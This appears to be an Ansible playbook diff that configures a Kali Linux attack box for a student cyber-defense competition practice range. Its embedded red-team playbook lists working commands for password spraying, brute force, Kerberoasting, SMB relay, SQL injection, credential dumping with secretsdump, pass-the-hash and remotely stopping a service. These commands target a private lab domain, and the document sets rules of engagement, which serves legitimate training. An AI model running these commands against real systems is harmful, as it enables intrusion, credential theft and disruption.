@@ -1,0 +1,385 @@
+---
+# Configure Kali Linux for CCDC Red Team Operations
+# This sets up additional tools and configurations for attacking the practice range
+
+- name: Update apt cache
+  apt:
+    update_cache: yes
+    cache_valid_time: 3600
+
+- name: Upgrade all packages
+  apt:
+    upgrade: dist
+    update_cache: yes
+  async: 3600
+  poll: 0
+  register: apt_upgrade
+
+- name: Install additional red team tools
+  apt:
+    name:
+      # Network scanning and enumeration
+      - masscan
+      - enum4linux
+      - nbtscan
+      - onesixtyone
+      - smbclient
+      - snmp
+      - smtp-user-enum
+      - ldap-utils
+      
+      # Password attacks
+      - hydra
+      - medusa
+      - patator
+      - john
+      - hashcat
+      - hashcat-data
+      - wordlists
+      
+      # Web application testing
+      - sqlmap
+      - wpscan
+      - nikto
+      - dirb
+      - dirbuster
+      - gobuster
+      
+      # Exploitation frameworks
+      - metasploit-framework
+      - exploit-db
+      - searchsploit
+      
+      # Post-exploitation
+      - mimikatz
+      - crackmapexec
+      - evil-winrm
+      - powershell
+      - powershell-empire
+      - bloodhound
+      - neo4j
+      
+      # Networking and pivoting
+      - proxychains4
+      - sshuttle
+      - chisel
+      
+      # AD attacks
+      - impacket-scripts
+      - responder
+      - ntlm-theft
+      
+      # Useful utilities
+      - tmux
+      - vim
+      - git
+      - python3-pip
+      - python3-venv
+      - golang
+      - docker.io
+      - docker-compose
+      
+    state: present
+  ignore_errors: yes
+
+- name: Install additional Python tools via pip
+  pip:
+    name:
+      - impacket
+      - ldap3
+      - pycryptodome
+      - pyasn1
+      - bloodhound
+      - mitm6
+      - adidnsdump
+    executable: pip3
+  ignore_errors: yes
+
+- name: Clone useful red team repositories
+  git:
+    repo: "{{ item.repo }}"
+    dest: "/opt/{{ item.name }}"
+    version: master
+  loop:
+    - { name: 'PowerSploit', repo: 'https://github.com/PowerShellMafia/PowerSploit.git' }
+    - { name: 'nishang', repo: 'https://github.com/samratashok/nishang.git' }
+    - { name: 'PEASS-ng', repo: 'https://github.com/carlospolop/PEASS-ng.git' }
+    - { name: 'LinEnum', repo: 'https://github.com/rebootuser/LinEnum.git' }
+    - { name: 'windows-privesc-check', repo: 'https://github.com/pentestmonkey/windows-privesc-check.git' }
+    - { name: 'PayloadsAllTheThings', repo: 'https://github.com/swisskyrepo/PayloadsAllTheThings.git' }
+    - { name: 'SharpCollection', repo: 'https://github.com/Flangvik/SharpCollection.git' }
+  ignore_errors: yes
+
+- name: Extract rockyou wordlist
+  shell: |
+    if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
+      gunzip /usr/share/wordlists/rockyou.txt.gz
+    fi
+  args:
+    creates: /usr/share/wordlists/rockyou.txt
+
+- name: Create CCDC attack workspace
+  file:
+    path: "{{ item }}"
+    state: directory
+    mode: '0755'
+  loop:
+    - /root/ccdc
+    - /root/ccdc/loot
+    - /root/ccdc/payloads
+    - /root/ccdc/logs
+    - /root/ccdc/screenshots
+
+- name: Create network configuration for range access
+  copy:
+    content: |
+      # WCC CCDC Range Network Configuration
+      
+      # Business Network (Target)
+      RANGE_NETWORK="10.{{ range_id }}.10.0/24"
+      RANGE_DC="10.{{ range_id }}.10.2"
+      RANGE_GATEWAY="10.{{ range_id }}.10.1"
+      
+      # Target hosts
+      DC01="10.{{ range_id }}.10.2"
+      FS01="10.{{ range_id }}.10.3"
+      WEB01="10.{{ range_id }}.10.4"
+      MAIL01="10.{{ range_id }}.10.5"
+      DB01="10.{{ range_id }}.10.6"
+      DNS01="10.{{ range_id }}.10.7"
+      LAMP01="10.{{ range_id }}.10.8"
+      FTP01="10.{{ range_id }}.10.9"
+      
+      # Domain info
+      DOMAIN="wcc.local"
+      DOMAIN_USER="administrator@wcc.local"
+      
+      # Add to /etc/hosts
+      echo "$DC01 dc01.wcc.local dc01" >> /etc/hosts
+      echo "$FS01 fs01.wcc.local fs01" >> /etc/hosts
+      echo "$WEB01 web01.wcc.local web01" >> /etc/hosts
+      echo "$MAIL01 mail01.wcc.local mail01" >> /etc/hosts
+      echo "$DB01 db01.wcc.local db01" >> /etc/hosts
+    dest: /root/ccdc/range-config.sh
+    mode: '0755'
+
+- name: Create quick enumeration script
+  copy:
+    content: |
+      #!/bin/bash
+      # Quick CCDC Range Enumeration Script
+      
+      source /root/ccdc/range-config.sh
+      
+      echo "[*] Starting enumeration of WCC CCDC Range..."
+      echo "[*] Target network: $RANGE_NETWORK"
+      echo ""
+      
+      # Nmap scan
+      echo "[+] Running nmap scan..."
+      nmap -sV -sC -oA /root/ccdc/logs/nmap-initial $RANGE_NETWORK
+      
+      # SMB enumeration
+      echo "[+] Enumerating SMB..."
+      crackmapexec smb $RANGE_NETWORK --gen-relay-list /root/ccdc/logs/smb-targets.txt
+      
+      # LDAP enumeration
+      echo "[+] Enumerating LDAP..."
+      ldapsearch -x -h $DC01 -s base namingcontexts > /root/ccdc/logs/ldap-enum.txt
+      
+      # Web enumeration
+      echo "[+] Scanning web servers..."
+      nikto -h http://$WEB01 -o /root/ccdc/logs/nikto-web01.txt
+      nikto -h http://$LAMP01 -o /root/ccdc/logs/nikto-lamp01.txt
+      
+      echo ""
+      echo "[*] Enumeration complete! Check /root/ccdc/logs/ for results"
+    dest: /root/ccdc/enum.sh
+    mode: '0755'
+
+- name: Create CCDC attack playbook
+  copy:
+    content: |
+      # WCC CCDC Red Team Playbook
+      
+      ## Initial Access
+      
+      ### 1. Network Reconnaissance
+      ```bash
+      # Quick network scan
+      nmap -sn 10.{{ range_id }}.10.0/24
+      
+      # Service enumeration
+      nmap -sV -sC -p- 10.{{ range_id }}.10.0/24 -oA nmap-full
+      
+      # Masscan for speed
+      masscan -p1-65535 10.{{ range_id }}.10.0/24 --rate=1000
+      ```
+      
+      ### 2. Active Directory Enumeration
+      ```bash
+      # LDAP enumeration (anonymous)
+      ldapsearch -x -h 10.{{ range_id }}.10.2 -s base namingcontexts
+      
+      # SMB enumeration
+      crackmapexec smb 10.{{ range_id }}.10.0/24
+      enum4linux -a 10.{{ range_id }}.10.2
+      
+      # User enumeration
+      crackmapexec smb 10.{{ range_id }}.10.2 -u '' -p '' --users
+      ```
+      
+      ### 3. Password Attacks
+      ```bash
+      # Password spraying (be careful not to lock accounts!)
+      crackmapexec smb 10.{{ range_id }}.10.2 -u users.txt -p 'Password123!' --continue-on-success
+      
+      # Hydra against SMB
+      hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.{{ range_id }}.10.2
+      
+      # AS-REP Roasting (no auth needed)
+      impacket-GetNPUsers wcc.local/ -dc-ip 10.{{ range_id }}.10.2 -usersfile users.txt
+      ```
+      
+      ## Persistence & Lateral Movement
+      
+      ### 4. Kerberoasting
+      ```bash
+      # Get service tickets
+      impacket-GetUserSPNs wcc.local/user:password -dc-ip 10.{{ range_id }}.10.2 -request
+      
+      # Crack tickets offline
+      hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
+      ```
+      
+      ### 5. SMB Relay
+      ```bash
+      # Start Responder
+      responder -I eth0 -wrf
+      
+      # SMB Relay (if SMB signing disabled)
+      impacket-ntlmrelayx -tf targets.txt -smb2support
+      ```
+      
+      ### 6. Web Application Attacks
+      ```bash
+      # SQL injection
+      sqlmap -u "http://10.{{ range_id }}.10.4/page.php?id=1" --dbs
+      
+      # Directory bruteforce
+      gobuster dir -u http://10.{{ range_id }}.10.4 -w /usr/share/wordlists/dirb/common.txt
+      
+      # WordPress scan (if applicable)
+      wpscan --url http://10.{{ range_id }}.10.8 --enumerate u,p
+      ```
+      
+      ### 7. Post-Exploitation
+      ```bash
+      # Dump credentials with secretsdump
+      impacket-secretsdump wcc.local/administrator:password@10.{{ range_id }}.10.2
+      
+      # Pass-the-Hash
+      crackmapexec smb 10.{{ range_id }}.10.0/24 -u Administrator -H <hash>
+      
+      # Evil-WinRM
+      evil-winrm -i 10.{{ range_id }}.10.2 -u Administrator -p password
+      ```
+      
+      ## Impact
+      
+      ### 8. Service Disruption (Use Sparingly!)
+      ```bash
+      # Stop services
+      crackmapexec smb 10.{{ range_id }}.10.3 -u admin -p pass -x "net stop Server"
+      
+      # Modify web content
+      # (Coordinate with white team!)
+      ```
+      
+      ## Rules of Engagement for CCDC Practice
+      
+      1. **Coordinate with Coach**: Get approval for attack scenarios
+      2. **No DoS**: Don't take services completely offline
+      3. **Document Everything**: Log all commands and results
+      4. **Give Blue Team a Fighting Chance**: Allow time for hardening
+      5. **Debrief After**: Share techniques used for learning
+      
+      ## Suggested Attack Timeline
+      
+      - **T+0 to T+30min**: Passive reconnaissance only
+      - **T+30 to T+60min**: Active scanning and enumeration
+      - **T+60+**: Password attacks and exploitation
+      - **T+2hr+**: Persistence and lateral movement
+      - **T+4hr+**: Advanced techniques
+      
+      ## Additional Resources
+      
+      - `/opt/PayloadsAllTheThings` - Huge collection of payloads
+      - `/opt/PEASS-ng` - Privilege escalation scripts
+      - `/opt/PowerSploit` - PowerShell post-exploitation
+      - `/opt/nishang` - PowerShell offensive scripts
+      
+    dest: /root/ccdc/PLAYBOOK.md
+    mode: '0644'
+
+- name: Create desktop shortcuts
+  copy:
+    content: |
+      [Desktop Entry]
+      Type=Application
+      Name=CCDC Workspace
+      Exec=xfce4-terminal --working-directory=/root/ccdc
+      Icon=utilities-terminal
+    dest: /root/Desktop/ccdc-workspace.desktop
+    mode: '0755'
+  ignore_errors: yes
+
+- name: Configure Metasploit database
+  shell: |
+    msfdb init
+  args:
+    creates: /usr/share/metasploit-framework/config/database.yml
+  ignore_errors: yes
+
+- name: Set up tmux configuration for red teaming
+  copy:
+    content: |
+      # CCDC Red Team tmux config
+      set -g mouse on
+      set -g history-limit 10000
+      
+      # Easy pane switching
+      bind -n M-Left select-pane -L
+      bind -n M-Right select-pane -R
+      bind -n M-Up select-pane -U
+      bind -n M-Down select-pane -D
+    dest: /root/.tmux.conf
+    mode: '0644'
+
+- name: Display red team information
+  debug:
+    msg:
+      - "========================================="
+      - "  WCC CCDC Red Team Box Ready!"
+      - "========================================="
+      - ""
+      - "IP Address: 10.{{ range_id }}.99.50"
+      - "Network Position: Management VLAN (external attacker)"
+      - "Target Network: 10.{{ range_id }}.10.0/24"
+      - ""
+      - "Quick Start:"
+      - "  1. cd /root/ccdc"
+      - "  2. source range-config.sh"
+      - "  3. ./enum.sh  (automated enumeration)"
+      - "  4. Review PLAYBOOK.md for attack ideas"
+      - ""
+      - "Tools installed:"
+      - "  - Metasploit Framework"
+      - "  - Impacket suite"
+      - "  - CrackMapExec"
+      - "  - Responder"
+      - "  - BloodHound"
+      - "  - And many more..."
+      - ""
+      - "IMPORTANT: Follow rules of engagement!"
+      - "========================================="
